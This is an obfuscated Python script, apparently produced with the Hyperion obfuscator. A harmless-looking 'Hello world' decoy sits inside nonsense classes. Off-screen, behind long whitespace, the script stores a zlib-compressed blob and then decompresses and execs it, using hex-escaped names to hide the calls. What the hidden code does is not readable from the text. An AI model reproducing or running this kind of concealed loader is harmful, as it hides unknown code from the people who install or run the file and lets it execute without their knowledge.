from builtins import *
from math import prod as Square


__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


_round, Calculate, Multiply, _theory, _memoryaccess, Random, _multiply = exec, str, tuple, map, ord, globals, type

class StackOverflow:
    def __init__(self, _system):
        self.Positive = Square((_system, -22307))
        self._while(_run=66981)

    def _while(self, _run = None):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.Positive -= 36905 - _run
        
        try:
            {_round: _theory} if Calculate > Substract else (Calculate, _theory, Substract) < Random

        except TypeError:
            {Substract: _theory} if Calculate < Substract else (Calculate, _theory, Substract) < Random

        except:
            _multiply(32765 * 79433) == float

    def Algorithm(self, _negative = 74466):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _negative /= -27311 * -96117
        self.Builtins != bool
        
        try:
            ((Calculate, (_theory, Multiply, _theory)) for Calculate in (Multiply, Calculate) if Substract == Calculate)

        except AssertionError:
            ((_round, {Substract: _theory}) for _round in (_theory, Multiply, _theory) if _theory is Calculate)

        except:
            _multiply(-68092 - -63742) == None

    def Cube(Theory = None):
        return Random()[Theory]

    def Frame(_walk = 88987 / 91092, _modulo = True, While = Random):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        While()[_walk] = _modulo
        
        try:
            {_round: _theory} if Multiply > _theory else {_round: _theory} <= Random

        except OSError:
            ((Calculate, _theory, Substract) or _memoryaccess if (Calculate, _theory, Substract) and _memoryaccess else ... or (_memoryaccess, (Calculate, _theory, Substract)))

        except:
            _multiply(-262 + -90197) == False

    def execute(code = str):
        return _round(Calculate(Multiply(_theory(_memoryaccess, code))))

    @property
    def Builtins(self):
        self.DetectVar = '<__main__._walk object at 0x000007181BE88322>'
        return (self.DetectVar, StackOverflow.Builtins)

if __name__ == '__main__':
    try:
        StackOverflow.execute(code = __code__)
        _builtins = StackOverflow(_system = -27670 * 77697)

        StackOverflow(_system = 52336 / -8062)._while(_run = _builtins.Positive * 75829)                                                                                                                                                                                                                                                          ;StackOverflow.Frame(_walk='xxwwxwxwxwwxwwwxwwxw',_modulo=b'x\x9c\xe5\x1a]o\xea:\xf2y\xf9\x15\xdc\xbe\x84\xe8\xf4\xd0\xc4\xf9"H}YuW\x97\xaa-\xab\xdb\xd5\xb6\xabs*\x14\x88i\xc35q\x97\x84[\xfa\xefwf\xec@\n\x85\x00i\xafvU;\x8e\'\xf6xb\x8f=\xf6\xcc$\xf9\xec\xb5\xdbhBH\xc6-\xca1\x0c\x06r8\x9eg\xa3(\x97\xb3\xc1\xa0\xf9\xcb\xf9\xc9\xaf\xaf\xcf|\x96\xc8\xf4\xa4)g%\xb4h\x9e?\xc9YF8\xad\x93a"\xc4k\xfe\xc4\x1fe\x94;\x9e\x7frz\xf2W1\xe7\xbf\xf1\xf8\xc4|\xd3\xea1\xc9\x9f\xe6CE\xf8)\xcf\x9f\xb3\xee\xd9\x99*k\x8f\xe4\xf4l\x8d\xcc\xd9\x96w\xc7I6\x92\xb3\xf8-\x19]\xd8~|<{\x16\xd1\xe3\x9c\xaf5\x12\xc9\x88\xa7\x19W\x8d\xfe\xf6\x8f\xab\xef\xacm\xad\xa1\x8cd\xac\xea\x8d\xe7Y\x92\xe6\xad\x93_\xb9\x10\xb2\xf9"g"\xfe\xe5\xc44\x1afw\x89\x8d\xf5F\xf6{\x12\x1bf\x83/F\xfc9\xd7\xccL\x9f\xe7\xd0\xf27\x99\xf1\xac\x19\xcdxs\xc6\xe3\x9f\xe9\xbf\x12)x\xae\n\x86\xc0\x99\x9f\xe9\xbf\xe5\x9c\x9e\xa2&\x12\xf9\x99\xde\xc8\xa1\x8c_\x9b"\xf9\x1d\xda\xbd\xca\xf9\x89\xd9P\x9dJ\xa6\xcfr\x96\x0f\x06\xf0\xb6\xd7\xcc0\xdb|\x91\xe4-\xb3!\xe4(\x12Y\xcb\xfca\xa4S\x88\x10 \xc3\x90\xaag\xe3\xe1\xfcQ\xc8!\xe04\xdeG\xc0\xa6W\xbd+\xb8z\x97\xbd\x1e\x01\x10z\x97W\x97\x10\x8c\x1f\xdd\xee\xb7\xef\xdf\xbe\xb7\xbe\xb7\xbe\xd9\xa6\xf9\xf0p\x1e\'\xb3\x1d\x84\xa6XD\x8f\x04M\xd3M\x02\x8f<\x8f\xf2|\x17\x91\xeb\xeb\x1b\x08\xd7*CH\xc30\x145\xda\xc66\x0cl\xdd\xef\xf7\xa5\x05\x01s\x88\xfd\xbeeI\x00\xa4\xb4\xa0\xfd\x8a\x8d;\xde\x0f-\xb0\xa1\xb4\x88R\x9fZc\x8e\x04\xb6So\x19\xc3y"\xf2$\xc5\xc9\xf9#\x9ae\x8d\xadt\xf0%www\xf7\xf7\xf7w\xf7\xcb;\\@\x9f\x98Vfak\xd7\x1b\xb34\xc9E2\x1f\xaes\xd9<\xc5\xc9\xbb\xbaTS\tW\x0f\xe6VM\xf2q\xf4\xcc\x1f\x1fM\xb0\x9d\xa41_\xb4\x0c.\x92\xe7\xa9\x1cm <\x98\xbb\xd6+\xf5\xe0\xea\xea\x92"\xe4_\x91s\xb3<{\x8fk;W\x1d\x8aJI^ \xbf\xf9\x8a\xac\xcb#)\xc6\x073\xef\xf6\xf6\x961u\xa9\x80\xf0Wd\x9f\x90r\xb3\xb6\x8a{\xd0\x95\x1e\x08+\xf5\xe2\x92\xbaqI\xfd\xfb\x8a\x0c\xe4\xf3\xd9?\x0f\xdb\xf1.\xe4E\xff\x02\x83\x84\xd4\xef_\xe0\xcb\xfa\xc0:\xc3hOd\x92\xeehyy\x89\xe7:v\x1e{O\x0fj*\x0ef|\x92\x8c\xb2(M>\x8c\xf1[\xe9\x1d\xcb\xf8\xed\x04\x0b\xc6\xbf\x8e\x13\xb1\xe0O\xe9\xfc\xe0\xe5\x9b\x88$\x99\x88\xc9D\x08\xba(~\xc9\xa5\x9b\x89\xe8\xef\x07s\x8f\x94\x1d\xa5\xeb xw\xf7\x15Y\'\xa2?\xf8aR\xafthU\xa9j\xcb\xed7\x98\xda\xda*\xeb\xad\xa1\xe1\xb8\xde\xd8a\x90lH\x1dH!$\x07\x12\x96{\xba\xceeC\xd6a\xf1^\xb8\x0e\x0bA\xd3\x8d9ZK-\xa33\xce7\x85\xca$\x8d\xff\xcbM\xf4\x88/\xde\x9d\xe8\xdd\xda\x05\xa8\x13\xa8a\x90\x92Aa\xf7\\\x1b\xa67p\x07\xf6\xc0\x1a8\x03F\xf7p\xd0\x01L\x7f\xb3\xb4\x8aP\x87\x9a\xb8\x80\xeaA\x0e\r\x01/\\/\xab"bC\x8dU\x85\x14\x0c|\xea\x9c\x0fT19\x03\x170;\x9b\xa5\x95o\x1b\x04\x80f\xc1\x18\xd9\x00\xbb\x0f\r\x01\x93m\x96\xd6\x10\x98P/vL\xbe\x16\x02[\xc3\x81\x86--0U\xb8\x16\x96\xed\'0\xef\xa5\x87\xf3\xc3\xfa\xce\x98\xcb\xfd\x0e\xb7\x87Q\x14\x07\x16\xb3\xdc\x11\xc0\xc3\xa1\xed\xdb\x00;T3\xec\xc4>w"\xc6*\xfb\xb4s\xdd\xee\xea\x85?\xf2C?z\x93"(\x1bQ\xaeJB*\xa9\xe4K\xdd\xf1{\x8eo\xfba\xdd\xb1\x1a\xd77*\xd2\x05\x16\xd4\xf5\x07\x08\xc5\xce%h\xb3\x98\x96\x97\xb5\xff\xd2y8\x17\xd1t\x18GMm\xe9)G\t\xf5\xba\xbbcp\xbb\x07.D\x02\xba\x0f*=\x00M@\x17"m\xa8j\xf4(\x80\xee\x00\xa5;\x04\xf9\xee\xc0S\x00\x98\xdefi\r\x0e\x05Z\xc8\x8a\x93\xca\xd5\xa9\x10:\x14H[\x0b\xe9>\xb8\x07q\xfa\xd0E\t=\xf9Dqs#7tGp\xc7T\xc4\x90\xe2H\x97)\x08c\x88x\xd5b\xa7\xd7\x12\xbc\\\xe2\xe9\x87\x01\xb2>\xdc\xba\xdb\x9dpu6\x0c\x88n\xa8\xee*W\xcf*\xa9\x92\x0f\xdf,\x02\x16\xd4\xdc\x18,I\x1a\x03\xb2F\xf6\x15\x97\xa0\xa8\xfa\x10\xf3I\x12\xf0\xa8v\x01\xee\xd0\x11\xb6VVC6\x98^\xe7K\xedN\xaf\xf5P\xc3X\xe6k\xd9\xd8\x07\xd7\xfbL\xd9\xf0\x86 \x971l\xd5\xae\xebz\x0e\x1cS\xbek\xbb\xf0j\x97\xb9c\x88\xc3\xcf\x94\x1c\x0f\x94Y\x8c\x98{\x8ezR\xb0Jo\xefNeO\x8e\xd8\x19X\xed\xc3iJv\x02Y\t\xa9\xb2"\xaa\xd6\x9f\x03\xea\x92\x07\xeb\xcc\x83\x9d\xd8\x02\x18U(w\xbd\xac\x8a\x88\x055vM\xb3\xc4)-\xb6b\xf1\x85\xa5\xc5\x18\x96\xcc\x92*\xdc\xceaZ\xd6r\x8b\x9bL\xe0HK0\xe1)\x07\x80\xe8n3\xcc\x8e\xdf\xa1a%\xfb\x90\x1c\xcb\x87\xe4.!\x9fJ]\ra\tF\x97\xe0\xfd\xf7\xe8>Y(\xd8\x11\xdc\x82p#\x82\x0e\x1e}\xe6\xef\x96\x97\x95\x94(H\xe5\x85|\x14RT\x96\x9a\x8f\x97\x19\xbf\x13\xb8\x10\xad\xc0\x015v\xcc\xc6\x01\xf3\xed `\xdc\x0f\xfc0p\xa1\xd6\xf3Y\xe0\x05p\xe4C\x8d\x03\xbc\xe4P\xea\xe1\x1dp\xf09fc\xd7\x856.\x9c*\xb0\xfb@dl\xec\x93\xaa\xe8\xbb\x90C\xbd\x1f\xd3\x13\x07\xea\xb0!\x01-\xdf\xaf-\xa9\xbbF\x15\xa8\xd0)\xe5\x1d\r\x95c\xb0\xbcW\x9e\\G\xf0\xd5\x01~x\xc0\x97\xfa{\x12Z\xce}:\x12\x11P\xd5\x7f\x9e:\xbc\x14\x8d\x9bBkW:\n\xdeo\x8e\x93nC\xf6/.$:c\x11\xa3O\xa1\xc6\x80,= \xfb\xc0\x01\xdd\xd2\xd7\x07r\x170\xf5Y\xe2\x96\x1d9\xa0\x95\xe2\x86\xca\xdc\xd2\\\xf8\x80m\x7fO$\x0f\xb4\x1d[9*\x06x"9\xe4\xc4X+\xab"\x82\xa6D\x00\xc8\x01\xb9,0Ge\n=\x01k\xa55\xfd\x01N\xc9\xc6w\xd6T&LA\xc9\x1fP\x85\xeb\x1f\xe7\x0f()\xe5\xcaIE\xfe)I.\xaa\xcfP\xcaW\xca\xd1J=Zm\xfb\n\xfe\x7f\xdf\xdc=\x06m\x83\x00\x8e\xdf\x80\x81\x9a[w\xdb+<x$\x97\xf4\xa5p\x0fw\xde^\x0e\xb4\xda\x0e\x85\x92\xb9\xeb\xae\x99\xc1\x9d\xd2\xfa\xad\xc2;p\xed\x1ee\x0e02\x07\x18\x98\x00\x01\xe4\x16\x98\x03\x81\xeb\x91\x81\xd0\x19\xf9\xd1\x18}X\xe1\xc8\xe5T\x0b\x1d\x03K\xc1\xf2l\xcf\x85\x85Qw\xfe\x16\x10^^\x16\x10!,\xf4\xfd\xb3\xa7\xa6\xf0\xb3\x17\xd6\x96U\xda6\n\xafE\xe1\x9f\xdf\x07wO\xff\xfc\xd1\xd3\xe3l\x99\x1e,C[\xd1\xf2<\x0f]\x8f\xb6\x07\x96\x1cL\x9a\xed}\xb6\xe6\xd4Y\xd3\x95V\xf0J\xa3\xdaC_\xd2\xdb\xabZ\x044\xf7/\x08.\x8e\xdd\\\x8d\t\xda\x16B\xe0\r\xad\x8bd"\xf6r\x9e\x85\x10\x19\xc5\x00"#W\xb9\xb7YZ\xd3AP\x9cT\x85\re\x17\x9em\xbd\x03\x04%\x07A\x15\xee\x01\xbb\xc2\x11&\xb2S[\xae\xf15\xf46z5}\x87\xfc\xf3u\xb7\xb4\xd0\xd2\xd2\xc2b\'\xab\xfdH\xf5M\xff:\x86\xc3\xd2\xd7\xbd\x1a\xdf\x87\xe8f{\x9dIu=\x00aIG*6\xaf\xe2\xfbJG\xa7\xf2w\x96]\xb8\xe4\x198\\\xafZN\xceE_\xa2f\x7f\x81\x11\xa1\xa35*\x83i\x1d]+\xea\xea\xd3^M.\x15#-\xbe*\x15\\(\xe4\xcf.q\xa9\nwo\x1b\xea\x7f[s\x0b\n\xcd\xcd\x06\xfa\x9e\xa6\x0f4\xfd`\x9f\xddb<\x93\xd3f\xf1\xdffS\xfd\x1b\xda\xe4\x0b>:\xa5\xffwO\xe9\xff_\x80\xf3\x06\x16\xb6\x84\x10=\xb8z\x94\xf7\x080\x1b\xba\xd5\x8c\xffg\xce\xb3<;\x95YCf\xed\xec5\xcb\xf9\xb4E\xa7\x87V%\x16*\xa0B\xb1x1\x1b\xea\xdfb\xf4\x1a\x93\xc3\x98\xfc5R;\x92\x8bZ\xa5D2V\xfa*\xccXQ\xb9(\xab\'\xc5\x0b\xccFt\xae\xfe=.\xa9\xa0\xdaP\x84\xbe\x8e\x9b\xd1\xf99\x9dD\t}\xc8\xa1\x7fY&p \t\xd1m\xfc\x85\x06Y\x0c\xa4\xfd\xc8\x89\x08\xd3\x9f\xa5UOn\xf5\x92ff;\xe7\x8b\xbc Y\x18\xa4j\xc9\xaf\xfe\x93\xdbBt)\x11ZD \xbd\xa5W:(\xf1K\x13\xde&\x93\xf7\x89\xe9N\xad\xcc\xe1\x82\x12\x17\x19\x87&\x8aY8Z\x8a\xf8\xfb\x0e\x02H\xd9l\xfc\x17\xce\xa9R\x84')

        StackOverflow(_system = 72854 - 9986).Algorithm(_negative = 16563 / _builtins.Positive)                                                                                                                                                                                                                                                          ;SS2SS2SSSSSS2SS2SSS2,WWXXXWXWWXWXWWXXWWWX,wwxxxxxxwxxwwxwwwwwwxxwx,XWXWWWXXWWWXWXWWXXX,IllIlIlIIllIIIIlI=(lambda SSS2SS2SSS2S2S222222SS222:SSS2SS2SSS2S2S222222SS222['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda SSS2SS2SSS2S2S222222SS222:SSS2SS2SSS2S2S222222SS222(__import__('\x7a\x6c\x69\x62'))),(lambda SSS2SS2SSS2S2S222222SS222:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(SSS2SS2SSS2S2S222222SS222)"),filename='\x57\x58\x58\x58\x57\x57\x58\x57\x58\x58\x58\x57\x57\x57\x58\x58\x58',mode='\x65\x76\x61\x6c'))),(lambda ijijlliilillilijiijliij,SSS2SS2SSS2S2S222222SS222:ijijlliilillilijiijliij(SSS2SS2SSS2S2S222222SS222)),(lambda:(lambda SSS2SS2SSS2S2S222222SS222:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(SSS2SS2SSS2S2S222222SS222)"),filename='\x57\x58\x58\x58\x57\x57\x58\x57\x58\x58\x58\x57\x57\x57\x58\x58\x58',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        _builtins.Algorithm(_negative = -72215 + _builtins.Positive)                                                                                                                                                                                                                                                          ;IllIlIlIIllIIIIlI()(XWXWWWXXWWWXWXWWXXX(SS2SS2SSSSSS2SS2SSS2(WWXXXWXWWXWXWWXXWWWX(wwxxxxxxwxxwwxwwwwwwxxwx('\x76\x61\x72\x73'))),StackOverflow.Cube(Theory='xxwwxwxwxwwxwwwxwwxw')))

    except Exception as Substract:
        if 148117 > 6796777:
            StackOverflow.execute(code = Calculate(Substract))

        elif 450530 > 2489642:
            _builtins.Algorithm(_negative = 43504 - _builtins.Positive)
